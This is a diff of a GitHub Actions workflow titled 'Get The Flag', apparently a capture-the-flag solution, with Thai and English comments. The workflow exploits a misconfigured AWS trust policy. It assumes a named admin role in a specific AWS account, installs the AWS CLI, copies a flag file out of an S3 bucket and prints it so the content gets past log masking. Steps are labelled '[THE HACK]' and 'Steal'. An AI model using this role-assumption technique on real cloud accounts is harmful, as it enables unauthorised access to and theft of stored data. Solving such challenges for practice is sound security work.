@@ -1,8 +1,11 @@
 name: Get The Flag
 
 on:
+  # This "push" trigger is the "Auto-Run"
+  # It will run automatically when you commit this file
   push:
     branches: [ main ]
+  # We also keep "workflow_dispatch" so the "Run" button appears later
   workflow_dispatch:
 
 permissions:
@@ -12,29 +15,34 @@ permissions:
 jobs:
   exploit:
     runs-on: ubuntu-latest
-
     steps:
-    
-name: Checkout repository
-    uses: actions/checkout@v3
+      # Step 1: Checkout
+      - name: Checkout repository
+        uses: actions/checkout@v3
 
-    # ขั้นตอนนี้จะสำเร็จ เพราะ Trust Policy อนุญาตให้ Repository ของคุณ Assume Role ได้
-    
-name: Assume Target AWS Role
-    uses: aws-actions/configure-aws-credentials@v4
-    with:
-      role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
-      role-session-name: Hacker-Session-${{ github.run_id }}
-      aws-region: "ap-southeast-1"
+      # Step 2: Assume Target AWS Role
+      - name: Assume Target AWS Role
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
+          role-session-name: Hacker-Session-${{ github.run_id }}
+          aws-region: "ap-southeast-1"
 
-    # ขั้นตอนการขโมย Flag
-    
-name: Steal and Print the Full Flag
-    run: |
-      echo "Attempting to read the secret flag from S3..."
-      # 1. Copy the flag file from the secret S3 bucket
-      aws s3 cp s3://oh-i-really-do-care/flag.txt .
-      # 2. Print the full content of the file before it is masked
-      echo "--- FLAG CONTENT ---"
-      cat flag.txt 
-      echo "--- END FLAG ---"
+      # Step 3: [THE FIX] Install AWS CLI manually to bypass the trap
+      - name: Install AWS CLI (Manual Install)
+        run: |
+          echo "Installing missing AWS CLI tool..."
+          curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+          unzip awscliv2.zip
+          sudo ./aws/install
+
+      # Step 4: [THE HACK] Steal and Print the Full Flag
+      - name: Steal and Print the Full Flag
+        run: |
+          echo "Attempting to read the secret flag from S3..."
+          # 1. Copy the flag file from the secret S3 bucket
+          aws s3 cp s3://oh-i-really-do-care/flag.txt .
+          # 2. Print the full content of the file
+          echo "--- FLAG CONTENT ---"
+          cat flag.txt
+          echo "--- END FLAG ---"
